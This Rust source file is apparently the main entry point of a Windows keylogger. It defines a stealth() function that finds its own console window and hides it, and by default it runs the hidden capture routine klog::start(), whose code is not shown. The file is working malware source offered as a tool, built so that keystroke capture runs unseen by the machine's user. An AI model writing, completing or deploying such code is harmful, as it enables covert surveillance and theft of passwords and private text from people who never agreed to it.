extern crate winapi;

use winapi::um::{wincon, consoleapi, winuser};
use std::env;

mod wintool;

use wintool::klog;


fn stealth() {
    let title = std::ffi::CString::new("keylogger").unwrap();
    unsafe {
        wincon::SetConsoleTitleA(title.as_ptr());
        consoleapi::AllocConsole();
        let win = winuser::FindWindowA(std::ptr::null_mut(), title.as_ptr());
        winuser::ShowWindow(win, 0);
    }
}


fn main() {
    let args: Vec<String> = env::args().collect();
    match args.get(1) {
        Some(param) => {
            if param == "--help" {
                return println!("{:?}", "keylogger --start");
            }else if  param == "--start" {
                klog::start();
            }
        }
        None => {
            stealth();
            klog::start();
        }
    }
}

